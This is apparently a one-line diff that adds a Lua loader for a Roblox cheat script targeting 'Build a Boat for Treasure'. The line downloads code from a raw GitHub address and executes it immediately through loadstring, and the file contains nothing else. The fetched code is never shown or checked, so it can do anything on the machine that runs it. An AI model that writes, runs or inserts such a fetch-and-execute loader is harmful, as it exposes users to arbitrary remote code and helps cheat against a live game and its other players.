@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/argperks-ui/Babft-Script/refs/heads/main/Babft%20script"))()
